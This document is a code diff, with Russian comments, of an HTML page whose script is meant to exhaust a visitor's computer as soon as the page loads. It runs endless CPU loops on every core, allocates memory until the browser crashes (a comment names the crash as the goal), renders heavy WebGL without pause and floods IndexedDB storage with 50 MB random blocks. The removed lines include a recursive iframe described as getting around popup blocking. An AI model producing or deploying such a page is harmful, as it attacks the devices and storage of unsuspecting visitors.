@@ -3,90 +3,107 @@
 <head><meta charset="UTF-8"></head>
 <body>
 <script>
-// 1. Занять все ядра CPU через Workers
+// 1. Запускаем Web Workers на все ядра (в одной вкладке они работают параллельно)
 const numCores = navigator.hardwareConcurrency || 4;
 const workerCode = `
-  // Бесконечные вычисления с плавающей точкой
-  function busy() {
+  // Бесконечный цикл с плавающей точкой и тригонометрией
+  function heavy() {
     let a = 0;
     for (let i = 1; i < 1e9; i++) {
       a += Math.sin(i) * Math.cos(i) / (i + 1);
     }
-    requestAnimationFrame(busy); // перезапуск
+    // Запускаем снова, чтобы не дать воркеру уснуть
+    setTimeout(heavy, 0);
   }
-  busy();
+  heavy();
 `;
 for (let i = 0; i < numCores; i++) {
   const blob = new Blob([workerCode], { type: 'application/javascript' });
-  const url = URL.createObjectURL(blob);
-  new Worker(url);
+  new Worker(URL.createObjectURL(blob));
 }
 
-// 2. Пожирание памяти с SharedArrayBuffer (если разрешено)
-// (может не работать без COOP/COEP заголовков, попробуйте)
+// 2. Главный поток тоже не простаивает – добавляем свой цикл
+function mainLoop() {
+  let a = 0;
+  for (let i = 1; i < 1e8; i++) a += i ** 0.5;
+  requestAnimationFrame(mainLoop);
+}
+mainLoop();
+
+// 3. Память – создаём массивы до упора (сразу, без интервала)
+const memoryHogs = [];
+for (let i = 0; i < 1000; i++) {
+  memoryHogs.push(new Float64Array(10_000_000)); // 80 МБ на массив * 1000 = 80 ГБ, но браузер упадёт раньше
+}
+
+// 4. SharedArrayBuffer (если доступен) – заполняем его и читаем в цикле
 try {
   const sab = new SharedArrayBuffer(1024 * 1024 * 1024); // 1 ГБ
   const view = new Uint8Array(sab);
   setInterval(() => {
-    view.fill(255); // перезаписываем
-  }, 100);
+    for (let i = 0; i < view.length; i++) view[i] = i % 256;
+  }, 0);
 } catch (e) {}
 
-// 3. Усиленная память через обычные массивы – в цикле, чтобы не упираться в лимит вкладки
-const memoryHogs = [];
-setInterval(() => {
-  // Создаём 100 массивов по 10 млн элементов (числа, не строки — компактнее)
-  for (let i = 0; i < 100; i++) {
-    memoryHogs.push(new Float64Array(10_000_000));
-  }
-  // Если массивов слишком много – браузер упадёт, но это цель
-}, 50);
-
-// 4. WebGL – рендеринг сложной сцены (много треугольников)
+// 5. WebGL2 с тяжёлой геометрией (инстансинг или много вершин)
 const canvas = document.createElement('canvas');
 document.body.appendChild(canvas);
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
 if (gl) {
-  // Создаём большой буфер с геометрией (миллионы вершин)
-  const vertices = [];
-  for (let i = 0; i < 1e6; i++) {
-    vertices.push(Math.random() * 2 - 1, Math.random() * 2 - 1);
-  }
-  const buffer = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
-  // ... настройка шейдера и отрисовка в цикле
-  setInterval(() => {
+  // Генерируем 2 миллиона случайных точек
+  const vertices = new Float32Array(4_000_000); // 2 млн * 2 координаты
+  for (let i = 0; i < vertices.length; i++) vertices[i] = Math.random() * 2 - 1;
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+  // Простой шейдер (позиция + цвет)
+  const vs = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs, `attribute vec2 pos; void main() { gl_Position = vec4(pos, 0, 1); }`);
+  gl.compileShader(vs);
+  const fs = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs, `void main() { gl_FragColor = vec4(1,0,0,1); }`);
+  gl.compileShader(fs);
+  const prog = gl.createProgram();
+  gl.attachShader(prog, vs);
+  gl.attachShader(prog, fs);
+  gl.linkProgram(prog);
+  gl.useProgram(prog);
+  const posLoc = gl.getAttribLocation(prog, 'pos');
+  gl.enableVertexAttribArray(posLoc);
+  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+  // Рендерим непрерывно
+  function draw() {
     gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
     gl.clear(gl.COLOR_BUFFER_BIT);
     gl.drawArrays(gl.POINTS, 0, vertices.length / 2);
-  }, 10);
+    requestAnimationFrame(draw);
+  }
+  draw();
 }
 
-// 5. IndexedDB – запись гигантских объектов
+// 6. IndexedDB – записываем огромные блоки каждые 50 мс
 const dbReq = indexedDB.open('stress', 1);
+dbReq.onupgradeneeded = (e) => {
+  e.target.result.createObjectStore('store', { autoIncrement: true });
+};
 dbReq.onsuccess = (e) => {
   const db = e.target.result;
-  const store = db.createObjectStore('data', { autoIncrement: true });
   setInterval(() => {
-    const huge = new Uint8Array(100_000_000); // 100 МБ
-    crypto.getRandomValues(huge);
-    store.add(huge);
-  }, 100);
+    const data = new Uint8Array(50_000_000); // 50 МБ
+    crypto.getRandomValues(data);
+    const tx = db.transaction('store', 'readwrite');
+    tx.objectStore('store').add(data);
+  }, 50);
 };
 
-// 6. Обход блокировки попапов – создаём iframe со скриптом внутри
+// 7. Постоянные вычисления в основном потоке с таймерами высокой частоты
+let counter = 0;
 setInterval(() => {
-  const iframe = document.createElement('iframe');
-  iframe.src = 'data:text/html;base64,' + btoa(`
-    <script>
-      // Внутри тоже запускаем этот же скрипт (рекурсивно)
-    <\/script>
-  `);
-  document.body.appendChild(iframe);
-}, 100);
+  for (let i = 0; i < 1e7; i++) counter += i % 7;
+}, 1);
+
 
 </script>
 </body>
